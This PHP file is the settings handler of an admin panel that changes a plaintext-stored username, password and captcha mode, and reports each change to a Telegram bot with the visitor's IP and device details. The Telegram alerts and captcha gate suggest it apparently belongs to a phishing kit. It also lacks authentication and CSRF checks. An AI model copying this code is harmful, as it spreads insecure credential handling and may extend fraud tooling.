<?php
error_reporting(0);
session_start();
include "../../libraries/get-country-code.php";
include "../../libraries/UserInfo.php";
include "../../setting/config.php";
include "../../setting/alert-admin.php";
include "../../setting/functions.php";

$ip = get_client_ip();
$present_time = date("H:i:s"."-"."m/d/y");
$jsonFilePath = "../admin/admin.json";
$json_data = file_get_contents($jsonFilePath);
$settings_data = json_decode($json_data, true);
$user_name = $settings_data['user_name'];
$password = $settings_data['password'];
$recaptcha_mode = $settings_data['recaptcha_mode'];
$recaptcha_type = $settings_data['recaptcha_type'];
$token_admin = TOKEN;
$chat_id_admin = CHATID;

if (isset($_POST['change_password'])) {
    $old_password = $_POST['old_password'];
    $new_password = $_POST['new_password'];

    if ($old_password === $password) {
        $settings_data['password'] = $new_password;
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Your password has been changed successfully. - " . $ip;

        $log = "Your password has been changed successfully.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    } else {

        $_SESSION["message_setting"] = "Password change failed. - " . $ip;

        $log = "Password change failed.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    }
}
elseif (isset($_POST['change_username'])) {
    $old_username = $_POST['old_username'];
    $new_username = $_POST['new_username'];

    if ($old_username === $user_name) {

        $settings_data['user_name'] = $new_username;
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Your username has been changed successfully. - " . $ip;

        $log = "Your username has been changed successfully.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    } else {

        $_SESSION["message_setting"] = "username change failed. - " . $ip;

        $log = "username change failed.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    }
}
elseif (isset($_POST['setup_recaptcha'])) {
    $mode_recaptcha = $_POST['mode_recaptcha'];
    $type_recaptcha = $_POST['type_recaptcha'];

    if ($mode_recaptcha === "on" && ($type_recaptcha === "cloudflare" || $type_recaptcha === "hcaptcha"|| $type_recaptcha === "captcha_calc")) {
        $settings_data['recaptcha_mode'] = 1;
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        if ($type_recaptcha === "cloudflare") {
            $settings_data['recaptcha_type'] = "cloudflare";
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode ON - Type Cloudflare | - " . $ip;

            $log = "Your setup recaptcha Successfully | Mode ON - Type Cloudflare |";
        
            // Send Data To Telegram :
            $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n". 
            "📍IP - ".get_client_ip()."\t\t | \t\t". 
            $detector->api() ."\r\n".
            "📊 Settings Status = " .$log."\r\n".
            "💻 DEVICE = " .UserInfo::get_device()."\r\n".
            "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
            "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
            "DATE AND TIME = ". $present_time ."\r\n".
            "🔐========= Settings Status =========🔐\r\n");
            telegram($token_admin, $message, $chat_id_admin);
        } 
        elseif ($type_recaptcha === "hcaptcha") {
            $settings_data['recaptcha_type'] = "hcaptcha";
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode ON - Type Hcaptcha | - " . $ip;

            $log = "Your setup recaptcha Successfully | Mode ON - Type Hcaptcha |";
        
            // Send Data To Telegram :
            $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n". 
            "📍IP - ".get_client_ip()."\t\t | \t\t". 
            $detector->api() ."\r\n".
            "📊 Settings Status = " .$log."\r\n".
            "💻 DEVICE = " .UserInfo::get_device()."\r\n".
            "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
            "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
            "DATE AND TIME = ". $present_time ."\r\n".
            "🔐========= Settings Status =========🔐\r\n");
            telegram($token_admin, $message, $chat_id_admin);
        }
        elseif ($type_recaptcha === "captcha_calc") {
            $settings_data['recaptcha_type'] = "captcha_calc";
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode ON - Type Captcha Calc | - " . $ip;

            $log = "Your setup recaptcha Successfully | Mode ON - Type Captcha Calc |";
        
            // Send Data To Telegram :
            $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n". 
            "📍IP - ".get_client_ip()."\t\t | \t\t". 
            $detector->api() ."\r\n".
            "📊 Settings Status = " .$log."\r\n".
            "💻 DEVICE = " .UserInfo::get_device()."\r\n".
            "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
            "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
            "DATE AND TIME = ". $present_time ."\r\n".
            "🔐========= Settings Status =========🔐\r\n");
            telegram($token_admin, $message, $chat_id_admin);
        }
    }
    elseif ($mode_recaptcha === "off" && $type_recaptcha === "off-type") {
        $settings_data['recaptcha_mode'] = 0;
        $settings_data['recaptcha_type'] = "off-type";
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode OFF - Type OFF | - " . $ip;

        $log = "Your setup recaptcha Successfully | Mode OFF - Type OFF |";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }
    else {
        $_SESSION["message_setting"] = "Failed Setup Recaptcha." . $ip;

        $log = "Failed Setup Recaptcha.";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }

    echo 
    "<script>
        window.location.replace('../pages/settings.php');
    </script>";

}